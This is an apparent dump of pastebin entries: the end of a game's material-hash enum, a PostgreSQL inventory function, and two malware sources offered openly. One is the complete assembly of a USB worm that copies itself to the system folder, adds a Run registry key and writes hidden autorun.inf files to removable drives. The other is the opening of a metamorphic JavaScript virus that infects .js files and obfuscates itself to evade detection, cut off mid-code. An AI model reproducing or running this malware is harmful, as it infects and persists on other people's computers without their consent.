id,title,username,language,date,content
    Hay = -1833527165, 
    Bushes = 581794674, 
    Twigs = -913351839, 
    Leaves = -2041329971, 
    Woodchips = -309121453, 
    TreeBark = -1915425863, 
    MetalSolidSmall = -1447280105, 
    MetalSolidMedium = -365631240, 
    MetalSolidLarge = 752131025, 
    MetalHollowSmall = 15972667, 
    MetalHollowMedium = 1849540536, 
    MetalHollowLarge = -583213831, 
    MetalChainlinkSmall = 762193613, 
    MetalChainlinkLarge = 125958708, 
    MetalCorrugatedIron = 834144982, 
    MetalGrille = -426118011, 
    MetalRailing = 2100727187, 
    MetalDuct = 1761524221, 
    MetalGarageDoor = -231260695, 
    MetalManhole = -754997699, 
    WoodSolidSmall = -399872228, 
    WoodSolidMedium = 555004797, 
    WoodSolidLarge = 815762359, 
    WoodSolidPolished = 126470059, 
    WoodFloorDusty = -749452322, 
    WoodHollowSmall = 1993976879, 
    WoodHollowMedium = -365476163, 
    WoodHollowLarge = -925419289, 
    WoodChipboard = 1176309403, 
    WoodOldCreaky = 722686013, 
    WoodHighDensity = -1742843392, 
    WoodLattice = 2011204130, 
    Ceramic = -1186320715, 
    RoofTile = 1755188853, 
    RoofFelt = -1417164731, 
    Fibreglass = 1354180827, 
    Tarpaulin = -642658848, 
    Plastic = -2073312001, 
    PlasticHollow = 627123000, 
    PlasticHighDensity = -1625995479, 
    PlasticClear = -1859721013, 
    PlasticHollowClear = 772722531, 
    PlasticHighDensityClear = -1338473170, 
    FibreglassHollow = -766055098, 
    Rubber = -145735917, 
    RubberHollow = -783934672, 
    Linoleum = 289630530, 
    Laminate = 1845676458, 
    CarpetSolid = 669292054, 
    CarpetSolidDusty = 158576196, 
    CarpetFloorboard = -1396484943, 
    Cloth = 122789469, 
    PlasterSolid = -574122433, 
    PlasterBrittle = -251888898, 
    CardboardSheet = 236511221, 
    CardboardBox = -1409054440, 
    Paper = 474149820, 
    Foam = 808719444, 
    FeatherPillow = 1341866303, 
    Polystyrene = -1756927331, 
    Leather = -570470900, 
    Tvscreen = 1429989756, 
    SlattedBlinds = 673696729, 
    GlassShootThrough = 937503243, 
    GlassBulletproof = 244521486, 
    GlassOpaque = 1500272081, 
    Perspex = -1619794068, 
    CarMetal = -93061983, 
    CarPlastic = 2137197282, 
    CarSofttop = -979647862, 
    CarSofttopClear = 2130571536, 
    CarGlassWeak = 1247281098, 
    CarGlassMedium = 602884284, 
    CarGlassStrong = 1070994698, 
    CarGlassBulletproof = -1721915930, 
    CarGlassOpaque = 513061559, 
    Water = 435688960, 
    Blood = 5236042, 
    Oil = -634481305, 
    Petrol = -1634184340, 
    FreshMeat = 868733839, 
    DriedMeat = -1445160429, 
    EmissiveGlass = 1501078253, 
    EmissivePlastic = 1059629996, 
    VfxMetalElectrified = -309134265, 
    VfxMetalWaterTower = 611561919, 
    VfxMetalSteam = -691277294, 
    VfxMetalFlame = 332778253, 
    PhysNoFriction = 1666473731, 
    PhysGolfBall = -1693813558, 
    PhysTennisBall = -256704763, 
    PhysCaster = -235302683, 
    PhysCasterRusty = 2016463089, 
    PhysCarVoid = 1345867677, 
    PhysPedCapsule = -291631035, 
    PhysElectricFence = -1170043733, 
    PhysElectricMetal = -2013761145, 
    PhysBarbedWire = -1543323456, 
    PhysPooltableSurface = 605776921, 
    PhysPooltableCushion = 972939963, 
    PhysPooltableBall = -748341562, 
    Buttocks = 483400232, 
    ThighLeft = -460535871, 
    ShinLeft = 652772852, 
    FootLeft = 1926285543, 
    ThighRight = -236981255, 
    ShinRight = -446036155, 
    FootRight = -1369136684, 
    Spine0 = -1922286884, 
    Spine1 = -1140112869, 
    Spine2 = 1457572381, 
    Spine3 = 32752644, 
    ClavicleLeft = -1469616465, 
    UpperArmLeft = -510342358, 
    LowerArmLeft = 1045062756, 
    HandLeft = 113101985, 
    ClavicleRight = -1557288998, 
    UpperArmRight = 1501153539, 
    LowerArmRight = 1777921590, 
    HandRight = 2000961972, 
    Neck = 1718294164, 
    Head = -735392753, 
    AnimalDefault = 286224918, 
    CarEngine = -1916939624, 
    Puddle = 999829011, 
    ConcretePavement = 2015599386, 
    BrickPavement = -1147361576, 
    PhysDynamicCoverBound = -2047468855, 
    VfxWoodBeerBarrel = 998201806, 
    WoodHighFriction = -2140087047, 
    RockNoinst = 127813971, 
    BushesNoinst = 1441114862, 
    MetalSolidRoadSurface = -729112334, 
    StuntRampSurface = -2088174996, 
    Temp01 = 746881105, 
    Temp02 = -1977970111, 
    Temp03 = 1911121241, 
    Temp04 = 1923995104, 
    Temp05 = -1393662448, 
    Temp06 = 1061250033, 
    Temp07 = -1765523682, 
    Temp08 = 1343679702, 
    Temp09 = 1026054937, 
    Temp10 = 63305994, 
    Temp11 = 47470226, 
    Temp12 = 702596674, 
    Temp13 = -1637485913, 
    Temp14 = -645955574, 
    Temp15 = -1583997931, 
    Temp16 = -1512735273, 
    Temp17 = 1011960114, 
    Temp18 = 1354993138, 
    Temp19 = -801804446, 
    Temp20 = -2052880405, 
    Temp21 = -1037756060, 
    Temp22 = -620388353, 
    Temp23 = 465002639, 
    Temp24 = 1963820161, 
    Temp25 = 1952288305, 
    Temp26 = -1116253098, 
    Temp27 = 889255498, 
    Temp28 = -1179674098, 
    Temp29 = 1078418101, 
    Temp30 = 13626292 
}"
nb7fRmxB,illuZ1oN's USB Worm - Source Code - Rohitab - Forums,FlyFar,ASM (NASM),Tuesday 4th of July 2023 11:45:26 PM CDT,";  W32/USB<span class=""searchlite"">Worm</span> - illuz1oN 2008
; Spreads using usb's!
; Copyright illuz1oN 2008
; h4ck-y0u.org
; Compile with FASM!!
 
include ""H:\Liam\FASM\INCLUDE\WIN32AX.inc""
 
.data
    iMutex db 'USB <span class=""searchlite"">Worm</span>, illuz1oN', 0
    regKey db '<span class=""searchlite"">Worm</span>zorz', 0
    regPth db 'software\Microsoft\Windows\CurrentVersion\Run',0
    newExe db 'drivers.exe', 0
    msgTit db 'illuz1oN USB <span class=""searchlite"">Worm</span>!', 0
    msgbox db 'This <span class=""searchlite"">worm</span> Has Spread to: ', 0
    sysName db 'illuz.exe', 0
    autoInf db 'autorun.inf', 0
    autoRun db '[autorun]', 0
    drv1 db 'A:\', 0
    drv2 db 'U:\', 0
    drv3 db 'H:\', 0
    drv4 db 'G:\', 0
    inf1 db 'A:\autorun.inf', 0
    inf2 db 'U:\autorun.inf', 0
    inf3 db 'H:\autorun.inf', 0
    inf4 db 'G:\autorun.inf', 0
    sysPath rb 256d
    myPath rb 256d
    reg dd ?
 
.code
wootwoot:
    mov byte [autoRun+10d], 13d
    mov byte [autoRun+11d], 10d
    mov dword [autoRun+12d], 'open'
    mov dword [autoRun+16d], '=dri'
    mov dword [autoRun+20d], 'vers'
    mov dword [autoRun+24d], '.exe'
    push 256d
    push myPath
    push 0
    call [GetModuleFileName]
    push 256d
    push sysPath
    call [GetSystemDirectory]
    push sysPath
    push sysName
    call [lstrcat]
    push 0
    push sysPath
    push myPath
    call [CopyFile]
    push reg
    push KEY_ALL_ACCESS
    push regPth
    push HKEY_LOCAL_MACHINE
    call [RegOpenKeyEx]
    cmp eax,0
    je exitwoot
    push sysPath
    call [lstrlen]
    cmp eax,0 
    je exitwoot
    push eax
    push sysPath
    push REG_SZ
    push regKey
    push reg
    call [RegSetValueEx]
    call checkdrive
 
checkdrive:
    push drv1
    call [GetDriveType]
    cmp eax,DRIVE_REMOVABLE
    je spread1
    xor eax,eax
    push drv2
    call [GetDriveType] 
    cmp eax,DRIVE_REMOVABLE
    je spread2
    xor eax,eax
    push drv3
    call [GetDriveType]
    cmp eax,DRIVE_REMOVABLE
    je spread3
    xor eax,eax
    push drv4
    call [GetDriveType]
    cmp eax,DRIVE_REMOVABLE
    je spread4
    call exitwoot
 
spread1:
    mov dword [drv1+3d], newExe
    push 0
    push FILE_ATTRIBUTE_HIDDEN
    push CREATE_ALWAYS
    push 0
    push 0
    push inf1
    call [CreateFile]
    mov ebx, eax
    push autoRun
    call [lstrlen]
    push 0
    push 0
    push eax
    push autoRun
    push ebx
    call [WriteFile]
    push ebx
    call [CloseHandle]
    xor ebx,ebx
    xor eax,eax
 
spread2:
    mov dword [drv2+3d], newExe
    push 0
    push FILE_ATTRIBUTE_HIDDEN
    push CREATE_ALWAYS
    push 0
    push 0
    push inf2
    call [CreateFile]
    mov ebx, eax
    push autoRun
    call [lstrlen]
    push 0
    push 0
    push eax
    push autoRun
    push ebx
    call [WriteFile]
    push ebx
    call [CloseHandle]
    xor ebx,ebx
    xor eax,eax
 
spread3:
    mov dword [drv3+3d], newExe
    push 0
    push FILE_ATTRIBUTE_HIDDEN
    push CREATE_ALWAYS
    push 0
    push 0
    push inf3
    call [CreateFile]
    mov ebx, eax
    push autoRun
    call [lstrlen]
    push 0
    push 0
    push eax
    push autoRun
    push ebx
    call [WriteFile]
    push ebx
    call [CloseHandle]
    xor ebx,ebx
    xor eax,eax
 
spread4:
    mov dword [drv4+3d], newExe
    push 0
    push FILE_ATTRIBUTE_HIDDEN
    push CREATE_ALWAYS
    push 0
    push 0
    push inf4
    call [CreateFile]
    mov ebx, eax
    push autoRun
    call [lstrlen]
    push 0
    push 0
    push eax
    push autoRun
    push ebx
    call [WriteFile]
    push ebx
    call [CloseHandle]
    xor ebx,ebx
    xor eax,eax
 
exitwoot:
    xor eax,eax
    push 0
    call [ExitProcess]
 
.end wootwoot"
csxxiK7d,in_insert_stock_opname_item,abirama62,PostgreSQL,Tuesday 4th of July 2023 11:40:23 PM CDT,"CREATE OR REPLACE FUNCTION in_insert_stock_opname_item(character varying, bigint, bigint, bigint, character varying, bigint)
  RETURNS void AS
$BODY$
DECLARE
    pSessionId				ALIAS FOR $1;
    pTenantId				ALIAS FOR $2;
    pStockOpnameId			ALIAS FOR $3;
    pWarehouseId			ALIAS FOR $4;
    pDateTime				ALIAS FOR $5;
    pUserId					ALIAS FOR $6;
    
	vStockOpnameNo			character varying:='';
	vStockOpnameDate		character varying:='';
	vOuId					bigint;
	vEmptyString			character varying:='';
	vNo						character varying:='N';
	vYes					character varying:='Y';
	vWarehouseId			bigint;
	
	vLatestInvLedgerClosingDate	character varying := '';
	vNextYearMonth			character varying := '';
	vStartDateBalanceStock		character varying := '';
	vLedgerCodeInv			character varying := 'INV';

	vParamNonActiveProduct  character varying:='SHOW_NON_ACTIVE_PRODUCT_STOCK_OPNAME';
	vFlgNonActiveProductShow character varying(1);
	
BEGIN

	vFlgNonActiveProductShow = vYes;
	
	SELECT A.stock_opname_no, A.stock_opname_date, A.ou_id 
			INTO vStockOpnameNo, vStockOpnameDate, vOuId
	FROM in_product_balance_stock_opname A
	WHERE A.stock_opname_id = pStockOpnameId;
	
	-- cari tanggal terakhir stock opname
	SELECT MAX(date_year_month) 
	FROM m_admin_process_ledger A 
	JOIN m_ou_structure B ON A.ou_id = B.ou_bu_id
	WHERE A.tenant_id = pTenantId
	AND B.ou_id = vOuId
	AND A.ledger_code = vLedgerCodeInv 
	AND A.date_year_month < SUBSTRING(vStockOpnameDate,1,6)
	AND A.status_ledger = '1' INTO vLatestInvLedgerClosingDate; 
	RAISE NOTICE 'vLatestInvLedgerClosingDate : %',vLatestInvLedgerClosingDate;
	
	SELECT TO_CHAR(TO_DATE(vLatestInvLedgerClosingDate,'YYYYMM') + interval '1 Month','YYYYMM') INTO vNextYearMonth;
	vStartDateBalanceStock = vNextYearMonth || '01';
	RAISE NOTICE 'get vStartDateBalanceStock : %',vStartDateBalanceStock;

	SELECT f_get_value_system_config_by_param_code(pTenantId, vParamNonActiveProduct) INTO vFlgNonActiveProductShow;
	
	-- insert ke tt dari summary monthly qty
	INSERT INTO tt_product_balance_stock_opname_item (
		session_id, tenant_id, status, product_balance_stock_id, 
		product_balance_id, product_id, product_status, qty
	)
	SELECT pSessionId, pTenantId, 'SUMMARY', E.product_balance_stock_id, 
		A.product_balance_id, A.product_id, A.product_status, A.qty
	FROM in_summary_monthly_qty A
	INNER JOIN m_warehouse_ou B ON A.warehouse_id=B.warehouse_id
	INNER JOIN m_product D ON D.product_id = A.product_id
	INNER JOIN in_product_balance_stock E ON A.product_balance_id = E.product_balance_id
										AND E.product_id = A.product_id
										AND E.product_status = A.product_status
										AND E.warehouse_id = pWarehouseId
	WHERE A.tenant_id = pTenantId
	AND B.ou_id = vOuId
	AND A.warehouse_id = pWarehouseId
	AND A.date_year_month = vNextYearMonth;
	
	-- insert ke tt dari data log
	INSERT INTO tt_product_balance_stock_opname_item (
		session_id, tenant_id, status, product_balance_stock_id, 
		product_balance_id, product_id, product_status, qty
	)
	SELECT  pSessionId, pTenantId, 'LOG', E.product_balance_stock_id, 
		A.product_balance_id, A.product_id, A.product_status, SUM(A.qty) AS qty
	FROM in_log_product_balance_stock A
	INNER JOIN m_warehouse_ou B ON A.warehouse_id=B.warehouse_id
	INNER JOIN in_product_balance_stock E ON A.product_balance_id = E.product_balance_id
										AND E.product_id = A.product_id
										AND E.product_status = A.product_status
										AND E.warehouse_id = pWarehouseId
	WHERE A.tenant_id = pTenantId
	AND B.ou_id = vOuId
	AND a.warehouse_id = pWarehouseId
	AND A.doc_date BETWEEN vStartDateBalanceStock AND vStockOpnameDate 
	GROUP BY  E.product_balance_stock_id, 
		A.product_balance_id, A.product_id, A.product_status;

	-- insert ke table opname item berdasarkan data dari table tt
	IF (vFlgNonActiveProductShow = vYes) THEN
        INSERT INTO in_product_balance_stock_opname_item(
                tenant_id, stock_opname_id, stock_opname_no,
                product_balance_stock_id, product_balance_id, product_id, product_code,
                product_status, qty, qty_opname, remark_opname, status, message,
                version, create_datetime, create_user_id, update_datetime, update_user_id)
        SELECT A.tenant_id, pStockOpnameId, vStockOpnameNo,
                A.product_balance_stock_id, A.product_balance_id, A.product_id, B.product_code,
                A.product_status, SUM(A.qty), 0, vEmptyString, vNo, vEmptyString,
                0, pDateTime, pUserId, pDateTime, pUserId
        FROM tt_product_balance_stock_opname_item A
        JOIN m_product B ON A.producT_id = B.product_id
        WHERE A.session_id = pSessionId
        GROUP BY A.tenant_id, A.product_balance_stock_id, A.product_balance_id, A.product_id, B.product_code, A.product_status
        ORDER BY A.product_id;
    ELSE
        INSERT INTO in_product_balance_stock_opname_item(
                tenant_id, stock_opname_id, stock_opname_no,
                product_balance_stock_id, product_balance_id, product_id, product_code,
                product_status, qty, qty_opname, remark_opname, status, message,
                version, create_datetime, create_user_id, update_datetime, update_user_id)
        SELECT A.tenant_id, pStockOpnameId, vStockOpnameNo,
                A.product_balance_stock_id, A.product_balance_id, A.product_id, B.product_code,
                A.product_status, SUM(A.qty), 0, vEmptyString, vNo, vEmptyString,
                0, pDateTime, pUserId, pDateTime, pUserId
        FROM tt_product_balance_stock_opname_item A
        JOIN m_product B ON A.producT_id = B.product_id
        WHERE A.session_id = pSessionId
        AND A.tenant_id = pTenantId AND B.active = vYes
        GROUP BY A.tenant_id, A.product_balance_stock_id, A.product_balance_id, A.product_id, B.product_code, A.product_status
        ORDER BY A.product_id;
    END IF;

END;	
$BODY$
  LANGUAGE plpgsql VOLATILE
  COST 100;
/"
RQVshhTj,Virus.JS.Transcriptase - Source Code,FlyFar,JavaScript,Tuesday 4th of July 2023 11:33:13 PM CDT,"//////////////////////////////////////////////////////////////////////////////
//
//  JS.Transcriptase
//  by Second Part To Hell
//  December 2012
//
//  This is a metamorphic self-compiling virus written in JavaScript.
// 
//  The virus consists of two parts:
//      1) The whole virus-code written in (obfuscated) JavaScript language
//      2) The whole virus-code written in a special meta-level language
//
//  The JavaScript-code (as well as the meta-level code) consists of a compiler
//  and an infection algorithm. At execution, the JavaScript-written compiler
//  analyses the meta-level code and derives a new JavaScript code for the next
//  generation (and infect potential victims with that code). The meta-level
//  code is integrated to the new derived generation in a fully obfuscated way.
//
//  The derivation of the new generation works with the following three steps:
//
//  1) PreCompilation
//     1.1) Change of variable and function names
//          Every defined function and variable gets a random name
//
//     1.2) Permutation
//          The order of every instruction in the code and in all sub-branches
//          are choosen randomly - except of connected instructions. Those
//          restrictions are defined in the meta-level code.
//
//     1.3) Creation of random numeric functions
//          A set of up to 35 functions with 1 to 5 inputs are created, which
//          contains arithmetic calculations (+,-,*,/,%) are created. Those will
//          be used for replacing numerical values of 0 to 255.
//
//          Example: 
//          function msbxaegrgbfqutl(pllwlqvevm,zorelhvsak,zpzrdbuy,rhuuwrxdj){return (36+zpzrdbuy)+(98+((zorelhvsak-(219-((17-(21%(rhuuwrxdj*10)))-pllwlqvevm)))-rhuuwrxdj))}
//          msbxaegrgbfqutl(161,184,152,9) gives 77
//          msbxaegrgbfqutl(227,205,255,88)) gives 56
//
//
//  2) Code-Creation
//     For every instruction in the meta-code, corresponding instructions of
//     JavaScript are created.
//
//     2.1) Every object, every expression, every number and every string will
//          be derived in a random way.
//
//          Numbers can become calculations, replaced by random numeric function
//                  calls, return values of usual functions or variables.
//          Strings can be splitted into substrings. They can become String.fromCharCode(),
//                  variables or functions.                   
//          Expressions can become eval(...), variables or functions.
//          Objects/Methods can be splitted: object.method() -> somefunc().method()
//
//     2.2) Instructions like ""while"" or ""if"" can be exchanged by ""for"" or
//          ""switch/case"". WScript.CreateObject/new ActiveXObject can be used
//          vise versa. The condition of if/while can change the logic from
//                   if(a>b) <-> if(b<a) or while(a==b) <-> while(b==a)
//
//          Calculation with numbers/strings is random. For example, increasing
//          a number by one can become (in addition to all mutations from 2.1):
//                       number++; number+=1; number=number+1
//
//          or adding strings:
//                       string1=string1+string2; string1+=string2;
//
//
//  3) Integration
//     The final step includes all variables and functions at random places in
//     the code. Functions can be included at every place (in the global scope),
//     variables are restricted to places before they are used for the first
//     time.
//     In addition, some random variables and functions can be bundled into
//     function-arrays; for example:
//
//        var1=17; var2=""Hello VXers!""; if(var1>12){WScript.Echo(var2)}
//                                      ->
//        somearray=[function(){return(""Hello VXers!"")},17}];
//        if(somearray[1]>12){WScript.Echo(somearray[0]()}
//
//
//  In the end, the virus will search for .JS files in the current directory
//  and prepends the next generation.     
//
//
//  A more detailed explanation of this project can be found in an article
//  called ""Metamorphism and Self-Compilation in JavaScript"", in valhalla#3.
//
//  The code below is a dropper for a first generation virus. When executing, it
//  creates a file called ""Transcript1.js"". This first generation does not
//  have all obfuscation features of the whole virus (for instance, the
//  variable/function-name randomization has been deactivated for some reason),
//  but ""Transcript1.js"" will infect .js files in the current directory with
//  the full obfuscated virus.
//
//  This is version 1 - that means there are hunderts of things to improve and
//  thousands of things to implement. When you have a self-compiling compiler,
//  you can do so many things that you could not even think about before! :)
//
//
//  ""Transcriptase"" is a process in micro-biology, where RNA code is translated
//  into DNA code. This process is mainly used by retro-viruses such as HIV to
//  infect cells (which are ""written"" in DNA). The mutation-rate of biologic
//  transcriptase is very high, which makes curing of HIV very difficult.
//  This code has a very similar strategy: It translates its meta-level
//  code (RNA) into JavaScript code (DNA) to infect files (cells). The muation 
//  rate is very high as well, to circumvent detection :) 
//
//
//  Tested the code at WindowsXP and Windows7. Derivation of the next generation
//  takes a couple of minutes (3-10mins usually) due to unoptimized functions
//  and complex algorithms.
//  
//
//  I thank hh86 for the constant motivation over this long period of time from
//  starting until fixing the last monster-bugs, and for the perfect name... :)
//
//////////////////////////////////////////////////////////////////////////////


nnn=s(13)+s(10);                                                
function s(n){return(String.fromCharCode(n));}  // fGiveMeString
function r(n){return(Math.floor(Math.random()*n));} // fGiveRandomNumber

function randomString() // fGiveRandomString
{
    var rndString='';                                                                                                                                                     
    var RNum3=Math.floor(Math.random()*10)+6;
    for(var i=0;i<RNum3;i++)
    {
        rndString+=s(Math.floor(Math.random()*26)+97);
    }
    return(rndString);
}


function isNumber(String2Check) //fIsNumber
{
    if(String2Check.charCodeAt(0)>47&&String2Check.charCodeAt(0)<58)
    {
        return(1);
    }
    return(0);
}

function GetAntiLogic(operator)  //fGetAntiLogic
{
    var RValue=operator;
    if(operator=='<'){RValue='>';}
    if(operator=='<='){RValue='>=';}
    if(operator=='>'){RValue='<';}
    if(operator=='>='){RValue='<=';}
    return(RValue);
}


function RemoveVariableMask(CodeStringWithMask) // fRemoveVariableMask 
{    
    while(CodeStringWithMask.indexOf('°+')!=-1||CodeStringWithMask.indexOf('+°')!=-1)
    {
        CodeStringWithMask=CodeStringWithMask.replace('°+','');
        CodeStringWithMask=CodeStringWithMask.replace('+°','');
    }
    return(CodeStringWithMask);
}



function RandomizeFunction(a,b) // fRandomizeFunction
{
    return(Math.random()*2-1)
}


function CreateNumeric(OriginalNum)  // fCreateNumeric
{
    return(OriginalNum) // debugging
    OriginalNum=parseInt(OriginalNum,10);
    
    var CreateNumericType=Math.floor(Math.random()*20);    
    
    if(OriginalNum>10000)
    {
        CreateNumericType=5;    // no calculations with big numbers
    }
    if(OriginalNum>=0&&OriginalNum<=255&&Math.floor(Math.random()*4)!=0)
    {
         var FAElement=FullArray[OriginalNum].length;
